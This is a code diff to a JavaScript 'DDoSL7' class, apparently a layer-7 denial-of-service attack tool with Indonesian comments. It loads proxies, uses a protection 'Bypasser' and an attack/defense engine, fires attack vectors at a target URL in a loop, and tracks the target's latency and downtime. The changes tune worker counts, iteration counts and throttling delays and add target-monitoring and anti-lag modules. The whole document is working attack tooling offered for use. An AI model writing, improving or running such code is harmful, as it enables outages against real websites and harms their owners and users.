@@ -18,6 +18,8 @@ const readline = require('readline');
 const DurationManager = require('../module/duration');
 const AttackManager = require('../module/attackManager');
 const optimizer = require('../module/optimalization');
+const TargetMonitor = require('../module/targetMonitor');
+const antiLag = require('../module/antiLag');
 const { Bypasser } = require('./Bypass');
 const fs = require('fs');
 
@@ -93,12 +95,11 @@ class DDoSL7 {
         this.isRunning = false;
         this.startTime = null;
         // Batasi jumlah Worker nyata (OS level) agar tidak mencekik CPU
-        this.maxWorkers = Math.min(os.cpus().length * 2, 4); 
+        this.maxWorkers = Math.min(os.cpus().length, 2); 
         this.safeModeActive = false;
         this.safeModeCooldown = 0;
         this.workers = [];
-        this.latencyHistory = [];
-        this.emaLatency = 0;
+        this.targetMonitor = new TargetMonitor(this.io);
         this.bypasser = new Bypasser(this.io);
         this.bypasser.loadProxiesFromFile('proxies.txt');
         this.ai = new AIAttackDefenseEngine();
@@ -221,7 +222,7 @@ class DDoSL7 {
         const scaleInterval = setInterval(() => {
             if (!this.isRunning) return clearInterval(scaleInterval);
 
-            const idealThreads = optimizer.getAdaptiveConcurrency(1000);
+            const idealThreads = optimizer.getAdaptiveConcurrency(this.maxWorkers * 2);
             const currentThreads = this.workers.length;
 
             if (idealThreads > currentThreads) {
@@ -304,14 +305,12 @@ class DDoSL7 {
                     this.activateSafeMode();
                 }
                 
-                if (this.io) {
-                    this.io.emit('target_movement', {
-                        status: res.status,
-                        latency: latency.toFixed(2),
-                        timestamp: new Date().toLocaleTimeString(),
-                        url: this.target
-                    });
-                }
+                // Delegasikan ke TargetMonitor untuk pengolahan data lengkap (EMA, Jitter, Health)
+                this.targetMonitor.recordMovement(this.target, {
+                    status: res.status,
+                    latency: latency
+                });
+
                 this.emitLog(`[AI:${this.ai.state}] HTTP ${res.status} | RTT: ${latency.toFixed(2)}ms`, 'success');
             } catch (err) {
                 if (this.io) this.io.emit('target_down', { url: this.target, error: err.message });
@@ -327,8 +326,9 @@ class DDoSL7 {
                 return;
             }
             this.executeVectors();
-            // Increase breathing room for the event loop
-            const nextDelay = this.safeModeActive ? 1000 : 250;
+            // Use Anti-Lag module to calculate dynamic delay
+            const baseDelay = this.safeModeActive ? 1000 : 150;
+            const nextDelay = baseDelay * antiLag.getThrottleMultiplier();
             setTimeout(runNext, nextDelay);
         };
         runNext();
@@ -344,10 +344,11 @@ class DDoSL7 {
 
     executeVectors() {
         const strategy = this.ai.getStrategy();
-        let iterations = 10 * strategy.concurrencyMultiplier;
+        // Reduce base iterations to prevent blocking the event loop
+        let iterations = 5 * strategy.concurrencyMultiplier;
 
         if (this.safeModeActive) {
-            iterations = Math.max(1, Math.floor(iterations * 0.1)); // Kurangi iterasi hingga 10%
+            iterations = 1; 
         }
 
         for (let i = 0; i < iterations; i++) {
